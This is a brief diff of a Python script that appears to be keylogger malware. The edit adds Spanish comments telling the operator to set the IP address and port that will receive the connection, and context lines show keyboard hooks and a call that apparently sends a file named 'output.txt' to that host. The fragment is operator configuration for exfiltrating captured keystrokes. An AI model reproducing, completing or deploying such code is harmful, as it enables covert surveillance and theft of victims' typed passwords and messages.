@@ -41,8 +41,8 @@ def d_():
     k.unhook_all()
     s_(a, ip, pt)
 
-ip = '192.168.100.177'
-pt = 447
+ip = '192.168.100.177' ##MODIFICAR A LA IP DESEADA PARA RECIBIR LA CONEXION
+pt = 447 ##MODIFICAR EL PUERTO DESEADO PARA RECIBIR LA CONEXION
 a = 'output.txt'
 
 try:
